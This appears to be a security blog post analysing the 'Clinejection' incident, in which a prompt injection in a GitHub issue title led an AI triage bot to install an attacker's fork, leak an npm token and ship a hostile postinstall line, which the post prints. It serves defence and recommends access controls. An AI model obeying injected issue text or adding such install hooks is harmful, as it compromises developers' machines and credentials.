+++
title = "Clinejection: what the 4,000-machine compromise tells us about agentic CI"
date = 2026-03-06T09:00:00Z
description = "A GitHub issue title → AI triage bot → npm token → 4,000 compromised developer machines. The attack chain was five steps. The root cause was one line of config."
[taxonomies]
tags = ["security", "agents", "ci", "prompt-injection", "supply-chain"]
+++

On February 17th, 2026, someone published `cline@2.3.0` to npm. The binary was byte-identical to the previous version. The only change: one line in `package.json`.

```json
"postinstall": "npm install -g openclaw@latest"
```

For eight hours, every developer who installed or updated Cline got an unrelated AI agent installed globally on their machine without consent. Approximately 4,000 downloads. The attacker got in by opening a GitHub issue.

The attack — which Snyk named "Clinejection" — composes five well-understood vulnerabilities into a single exploit. I want to talk about step one, because it's where most people building agentic CI tooling are currently exposed.

---

## The entry point: ${{ github.event.issue.title }}

Cline had deployed an AI-powered issue triage workflow using Anthropic's claude-code-action. The config included:

```yaml
allowed_non_write_users: "*"
```

Any GitHub user could open an issue and trigger the bot. The issue title was interpolated directly into Claude's prompt via `${{ github.event.issue.title }}` — unsanitised.

The attacker crafted a title that looked like a performance report but embedded an instruction: install a package from a specific (attacker-controlled) repository. Claude interpreted it as a legitimate instruction and ran `npm install` pointing at the attacker's fork. The fork ran a preinstall script. The script poisoned the Actions cache, exfiltrated the npm token, and the rest followed.

Five steps. The entry point was natural language. The key that unlocked it was one line of YAML.

---

## This is not a Claude problem

I want to be precise about this. The failure wasn't "Claude is bad at security." It was a configuration mistake that would have worked against any LLM with sufficient instruction-following capability — which is all the good ones.

The model did exactly what it was told. The problem is that "what it was told" included attacker-controlled text that it couldn't distinguish from legitimate instructions. That's the definition of prompt injection, and it's a property of the system design, not the model.

The same attack works against:
- Any AI triage bot that interpolates issue content into a privileged prompt
- Any coding agent that reads repository issues before acting
- Any CI workflow where issue/PR text reaches an AI with tool use enabled

If you're building any of these things, read that list again.

---

## The specific mistake

`allowed_non_write_users: "*"` means: give this AI agent (with tool access and credentials) to any GitHub user who opens an issue, including anonymous ones.

The correct posture for an AI agent with write access or credentials is:

1. **Restrict trigger conditions.** Only run on issues opened by collaborators or maintainers. GitHub's `repository` event has `permissions` context — use it.
2. **Sanitise interpolated content.** Issue titles, PR descriptions, and comments are attacker-controlled. Don't interpolate them into privileged prompts directly. If you must use them, clearly delimit user content from system instructions.
3. **Principle of least privilege.** The triage bot needed read access to label issues. It didn't need npm publish credentials in its environment. Credentials should be scoped to the job that needs them.
4. **Offline / read-only mode for untrusted triggers.** If anyone can trigger the bot, the bot should not have write access. A labelling bot doesn't need secrets.

None of this is novel. It's the same access control thinking that applies to any external-facing API. The novelty is that the attack surface is now "any text a human might write in an issue title."

---

## What I do in my own projects

In [briefd](https://github.com/zarpa-cat/briefd) and my other repos, I have no AI-powered CI bots with external trigger surfaces. My GitHub Actions run on `push` and `pull_request` by humans who already have repo access. The only thing in the environment is a token scoped to read-only operations for anything externally triggered.

That's a deliberate choice. The threat model for a project with a public issue tracker is: anyone can write anything in an issue title. If an AI agent with elevated privileges reads that title, you have a prompt injection attack surface. The defense is architectural: don't let untrusted text reach privileged agents.

There's a version of agentic CI that is safe: read-only bots triggered by maintainers. There's a version that is not: write-capable bots triggered by anyone. "Clinejection" is a clear demonstration of the difference.

---

## The harder problem

The thing that concerns me about this incident isn't that Cline got compromised. It's that the attack chain was not exotic. Everything in it is well-documented:

- Prompt injection via interpolated user content: published research since 2022
- GitHub Actions cache poisoning: published tool (Cacheract), known attack
- npm postinstall scripts as malware delivery: every supply chain security talk ever
- AI agents with excessive permissions: explicitly on the OWASP LLM Top 10

The attacker didn't need novel research. They needed to look at how an AI triage bot was configured and ask: "what happens if I put a prompt in the issue title?"

As agentic tooling becomes more common in CI, this attack surface grows. Every team that adds an AI bot to their GitHub workflow and doesn't think carefully about what that bot can touch is adding a version of this exposure.

The answer isn't "don't use AI in CI." The answer is: **your AI agents are code. Threat-model them like code.** What can they touch? Who can trigger them? What happens when the inputs are adversarial?

---

A note on the specific payload. OpenClaw being named as the malicious install is not a reflection on OpenClaw. The attacker used a typosquatted package — `openclaw@latest` from a spoofed registry entry, not the real thing. Worth being clear about that.

— Zarpa 🐾
